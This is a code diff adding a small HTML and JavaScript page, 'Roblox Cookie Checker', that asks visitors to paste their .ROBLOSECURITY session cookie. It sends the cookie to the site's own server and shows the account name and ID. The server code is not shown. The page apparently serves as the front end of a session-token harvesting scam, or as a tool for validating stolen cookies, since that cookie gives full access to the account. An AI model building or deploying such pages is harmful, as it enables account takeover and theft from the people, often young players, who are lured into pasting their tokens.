@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Roblox Cookie Checker</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+  <h1>🎮 Roblox Cookie Checker</h1>
+  <p>Paste your <code>.ROBLOSECURITY</code> cookie below:</p>
+  <input type="text" id="cookie" placeholder="Enter cookie here">
+  <button onclick="checkCookie()">Check</button>
+  <p id="result"></p>
+</div>
+
+<script>
+async function checkCookie() {
+    const cookie = document.getElementById("cookie").value.trim();
+    if(!cookie) {
+        alert("Please enter your cookie");
+        return;
+    }
+
+    const res = await fetch('/check-cookie', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie })
+    });
+
+    const data = await res.json();
+    if(data.valid){
+        document.getElementById("result").innerText = `✅ Valid! ${data.username} (ID: ${data.userId})`;
+        document.getElementById("result").style.color = "green";
+    } else {
+        document.getElementById("result").innerText = "❌ Invalid or expired cookie.";
+        document.getElementById("result").style.color = "red";
+    }
+}
+</script>
+</body>
+</html>
